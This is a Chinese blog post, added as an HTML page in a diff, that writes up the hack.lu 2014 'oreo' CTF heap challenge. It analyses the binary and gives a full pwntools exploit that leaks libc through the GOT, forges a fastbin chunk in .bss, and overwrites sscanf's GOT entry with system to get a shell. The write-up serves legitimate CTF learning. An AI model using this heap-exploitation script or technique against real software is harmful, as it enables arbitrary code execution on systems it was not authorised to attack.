@@ -1,0 +1,235 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>2014_hack.lu_oreo - gravity的个人博客</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate">
+    <meta name="keywords" content="GraVity0,"> 
+    <meta name="description" content="日常来一波检查：这里没开relro，我们可以修got表。接下来我们在ida中分析一下这个程序：可以看到他有6个功能，比较关键的add、show、order也都有，那我们就具体看看各个功能：首先是ad,"> 
+    <meta name="author" content="yuntao you"> 
+    <link rel="alternative" href="atom.xml" title="gravity的个人博客" type="application/atom+xml"> 
+    <link rel="icon" href="/img/first.jpg"> 
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <link rel="stylesheet" href="/css/diaspora.css">
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads" src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+</head>
+</html>
+<body class="loading">
+    <span id="config-title" style="display:none">gravity的个人博客</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">2014_hack.lu_oreo</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class="main">
+        <h1 class="title">2014_hack.lu_oreo</h1>
+        <div class="stuff">
+            <span>十月 05, 2019</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <p>日常来一波检查：<br><img src="https://i.loli.net/2019/10/05/F5JVTWjudNOqEpQ.jpg" alt="B4B5832C704E4654AC571DC5C1B928CE.jpg"><br>这里没开relro，我们可以修got表。<br>接下来我们在ida中分析一下这个程序：<br><img src="https://i.loli.net/2019/10/05/Wf5bdiuNDo4Ux3j.jpg" alt="01E60A40B9CA4521A534516D11C1BAD0.jpg"><br>可以看到他有6个功能，比较关键的add、show、order也都有，那我们就具体看看各个功能：<br>首先是add：<br><img src="https://i.loli.net/2019/10/05/5ZqJAEH7zGU2l6B.jpg" alt="A4A4951B0B8645B5A41CCDCB459CE5CC.jpg"><br>他在*((_DWORD *)dword_804A288 + 13)处存储了上个heap地址。（dword是四个字节）。<br>name的内容在dword_804A288 + 25处存储。<br>继续看description，这里它可以写入0x38个字节，可以很轻易的覆盖前面的两个内容，所以这里是存在溢出的。    </p>
+<p>接下来是show_rifles了：<br><img src="https://i.loli.net/2019/10/05/mYutH4I8rxS1D9p.jpg" alt="A729986C83B1430C8C1A0F84FE793FDB.jpg"><br>算是比较正常的show功能了。没什么太过特别的地方。     </p>
+<p>然后是order：<br><img src="https://i.loli.net/2019/10/05/y3bxfm18Ywp4IzM.jpg" alt="EFD6CDBDA2F146C9A50371FDC07109D3.jpg"><br>这里是具有free的一个功能，我们在这里看到free的只是*((_DWORD *)dword_804A288 + 13)处的heap，所以我们修改free为system的话，是不能传入/bin/sh的，所以我们暂不考虑修改free。      </p>
+<p>下一个是leave_message:<br><img src="https://i.loli.net/2019/10/05/U15EBXa7PihANMe.jpg" alt="2DD1345EACD243C9AC9B957FE0EAE489.jpg"><br><img src="https://i.loli.net/2019/10/05/KNtrYwv3sBqTdJ1.jpg" alt="F2E48315C23043259F60147628B17FD9.jpg"><br><img src="https://i.loli.net/2019/10/05/chxGwEjoX57RCat.jpg" alt="40E799847910460E84E871BC16BAA7D6.jpg"><br>可以看到我们输入的message会被写入一个.bss段的地址指向的一个固定地址。       </p>
+<p>接下来我们来理一下思路：       </p>
+<ul>
+<li>首先我们想通过修改got表来达到调用system的作用：       <ul>
+<li>所以我们要泄露函数的地址，这里可以通过将函数的got表地址放入*((_DWORD *)dword_804A288 + 13)处，之后通过show泄露出来。</li>
+<li>其次free函数达不到目的，这里我选择修改的是__isoc99_sscanf()。 因为他是在我们选择功能的时候被调用的，我们可以很轻易的将/bin/sh传入。         </li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>当然泄露出地址之后就要考虑修改了，而leave_message是向0x0804a2a8指向的地址写入，所以我们只要将它指向的地址修改为__isoc99_sscanf()的got表地址，就可以轻易的将其修改。    </li>
+</ul>
+<ul>
+<li>所以接下来我们就需要将对分配到.bss段，这就用到了Arbitrary Alloc 技术。将0x0804a2a8作为一个heap的next，free之后就会将0x0804a2a8放入fastbin，再次分配时就会返回到这个地方。       </li>
+</ul>
+<pre><code class="python">from pwn import *
+
+p = process(&#39;./oreo&#39;)
+elf = ELF(&quot;./oreo&quot;)
+libc = ELF(&#39;./libc.so.6&#39;)
+# context.log_level = &#39;debug&#39;
+
+def add(descrip, name):
+    p.sendline(&#39;1&#39;)
+    p.sendline(name)
+    p.sendline(descrip)
+
+def show_rifle():
+    p.sendline(&#39;2&#39;)
+    p.recvuntil(&#39;===================================\n&#39;)
+
+def order():
+    p.sendline(&#39;3&#39;)
+
+def message(notice):
+    p.sendline(&#39;4&#39;)
+    p.sendline(notice)
+
+payload1 = &#39;a&#39;*27+p32(elf.got[&#39;puts&#39;])
+add(&#39;a&#39;*25,payload1)
+show_rifle()
+p.recvuntil(&#39;===================================\n&#39;)
+p.recvuntil(&#39;Description: &#39;)
+puts_addr = u32(p.recvuntil(&#39;\n&#39;, drop=True)[:4])
+log.success(&#39;puts_addr: &#39;+hex(puts_addr))
+
+libc_base = puts_addr - libc.symbols[&#39;puts&#39;]
+system_addr = libc_base + libc.symbols[&#39;system&#39;]
+binsh_addr = libc_base + next(libc.search(&#39;/bin/sh&#39;))
+log.success(&#39;system_addr: &#39;+hex(system_addr))
+log.success(&#39;binsh_addr: &#39;+hex(binsh_addr))
+
+num = 1
+while num &lt; 0x3f:
+    add(&#39;a&#39;*25,&#39;a&#39;*27)
+    num += 1
+
+payload2 = &#39;a&#39;*27+p32(0x0804a2a8)
+add(&#39;a&#39;*25,payload2)
+
+payload3 = &#39;\x00&#39;*0x20+p32(0x40)+p32(0x50)
+message(payload3)
+order()
+p.recvuntil(&#39;Okay order submitted!\n&#39;)
+
+sscanf_got = elf.got[&#39;__isoc99_sscanf&#39;]
+add(&#39;a&#39;,p32(sscanf_got))
+
+message(p32(system_addr))
+p.sendline(&#39;/bin/sh\0&#39;)
+
+p.interactive()
+</code></pre>
+<p><strong>注意：</strong><br>在填充fake_chunk是一定要明确message写入的位置。</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="http://link.hhtjim.com/163/5146554.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="http://link.hhtjim.com/qq/001faIUs4M2zna.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link" data-ae="false" data-ci="" data-cs="" data-r="" data-o="" data-a="" data-d="false">查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+            
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/nito.model.json"},"display":{"position":"lift","width":200,"height":350},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+</html>
